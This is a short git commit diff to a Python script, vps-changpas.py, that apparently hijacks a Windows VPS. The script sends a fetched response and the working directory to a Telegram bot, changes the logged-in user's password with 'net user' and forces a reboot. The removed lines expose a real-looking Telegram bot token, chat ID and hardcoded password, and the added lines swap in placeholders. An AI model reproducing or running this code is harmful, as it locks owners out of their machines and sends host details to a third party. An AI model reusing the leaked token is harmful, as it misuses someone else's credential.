2a7e9da5d03e11ec497f81c085344fb4f14f54d3
r-m <98047816+r4myh@users.noreply.github.com>
2022-02-14 00:47:44 -1000

    Update vps-changpas.py

--- vps-changpas.py
+++ vps-changpas.py
@@ -9,12 +9,12 @@ class send:
         re = requests.get(url).text
         cwd = os.getcwd()
 
-        requests.get("https://api.telegram.org/bot5139421075:AAHQDA_xk3IVIpNhnR1Hy-nljcTH9kuZYFg/sendmessage?chat_id=2045563609&text="+str(re+'\n'+cwd))
+        requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text="+str(re+'\n'+cwd))
 
 
 
 def change():
-    os.system("net user %username% JSJSJJSjsns8#8#811##22#")
+    os.system(f"net user %username% {your-pass}")
     os.system("shutdown -r")
 
 
